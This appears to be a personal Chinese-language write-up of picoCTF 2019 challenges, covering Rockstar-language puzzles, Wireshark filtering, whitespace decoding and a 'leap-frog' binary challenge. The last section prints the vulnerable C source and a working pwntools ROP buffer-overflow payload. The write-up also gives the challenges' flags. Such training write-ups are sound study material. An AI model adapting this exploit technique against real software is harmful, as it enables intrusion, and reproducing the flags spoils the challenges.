# picoCTF 2019 subsequent
## mus1c - Points: 300 - (Solves: 1560)General Skills
### review
看了別人了writeup
我服了 rockstar 這款語言的repo https://github.com/RockstarLang/rockstar
https://codewithrockstar.com/online 用這個解
噴出 ascii
### code
```
Pico's a CTFFFFFFF
my mind is waitin
It's waitin

Put my mind of Pico into This
my flag is not found
put This into my flag
put my flag into Pico


shout Pico
shout Pico
shout Pico

My song's something
put Pico into This

Knock This down, down, down
put This into CTF

shout CTF
my lyric is nothing
Put This without my song into my lyric
Knock my lyric down, down, down

shout my lyric

Put my lyric into This
Put my song with This into my lyric
Knock my lyric down

shout my lyric

Build my lyric up, up ,up

shout my lyric
shout Pico
shout It

Pico CTF is fun
security is important
Fun is fun
Put security with fun into Pico CTF
Build Fun up
shout fun times Pico CTF
put fun times Pico CTF into my song

build it up

shout it
shout it

build it up, up
shout it
shout Pico
```
picoCTF{rrrocknrn0113r}
## 1_wanna_b3_a_r0ck5tar - Points: 350 - (Solves: 1313)General Skills
跟上一題一樣
### code
```
Rocknroll is right              
Silence is wrong                
A guitar is a six-string        
Tommy's been down               
Music is a billboard-burning razzmatazz!
Listen to the music             
If the music is a guitar                  
Say "Keep on rocking!"                
Listen to the rhythm
If the rhythm without Music is nothing
Tommy is rockin guitar
Shout Tommy!                    
Music is amazing sensation
Jamming is awesome presence
Scream Music!                   
Scream Jamming!                 
Tommy is playing rock           
Scream Tommy!       
They are dazzled audiences                  
Shout it!
Rock is electric heaven                     
Scream it!
Tommy is jukebox god            
Say it!                                     
Break it down
Shout "Bring on the rock!"
Else Whisper "That ain't it, Chief"                 
Break it down
```
picoCTF{BONJOVI}
## shark on wire 1 - Points: 150 - (Solves: 3425)Forensics
### review
當初找的要死要活的 就是沒找到

無法 ~~$strings pacp |grep pico~~

要進去 找 udp or tcp stream 一個個看
>udp.stream eq 6 六是編號 wireshark 給的

>less than 小于 < lt函數真D好用
小于等于 le
其他：
等于 eq
大于 gt
大于等于 ge

然後follow stream 就可以了

picoCTF{StaT31355_636f6e6e}
## WhitePages - Points: 250 - (Solves: 1357)Forensics
### review
>hexdump -C file 替換成 xxd

有點通靈
話說 pwntools 函數真D好用
```
from pwn import *

with open('./whitepages.txt', 'rb') as f:
  data = f.read()

data  = data.replace('e28083'.decode('hex'), '0')
data  = data.replace(' ', '1')

print unbits(data)
```
picoCTF{not_all_spaces_are_created_equal_c167040c738e8bcae2109ef4be5960b1}
## leap-frog - Points: 300 - (Solves: 233)Binary Exploitation
### review
一開始看了看 覺的應該是 把 func 順序排好就好 結果不是
`if(win1 && !win1)` <----- 這怎樣都不會過阿

然後我是嘗試直接跳上 `win2=1` 這樣 stack 會死掉 東西亂光光 , 我又不信邪 想說修好stack 而已 繼續搞payload

呵呵 搞死自己

看了大大的writeup 才發現 乾 怎沒想到

它是call gets 改 win* 因為他們是連在一起的

改完跳 display_flag

### code
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>


#define FLAG_SIZE 64

bool win1 = false;
bool win2 = false;
bool win3 = false;

void leapA() {
  win1 = true;
}

void leap2(unsigned int arg_check) {
  if (win3 && arg_check == 0xDEADBEEF) {
    win2 = true;
  }
  else if (win3) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void leap3() {
  if (win1 && !win1) {
    win3 = true;
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void display_flag() {
  char flag[FLAG_SIZE];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  if (win1 && win2 && win3) {
    printf("%s", flag);
    return;
  }
  else if (win1 || win3) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```
### payload
```
from pwn import *
r=process('./rop')
r.recvuntil('>')
raw_input(':')
#main_addr = 0x80487c9
gets_plt = 0x08048430
win1_addr = 0x0804A03D
display_flag_addr = 0x080486b3
payload = 'a'*28
payload += p32(gets_plt)              # ret1
payload += p32(display_flag_addr)     # ret2
payload += p32(win1_addr)             # ret1 arg
r.sendline(payload)
r.sendline('\x01'*3)                  # get() input
r.interactive()

```
picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_f60266f9}
*阿送出去 他說flag不對？？？*
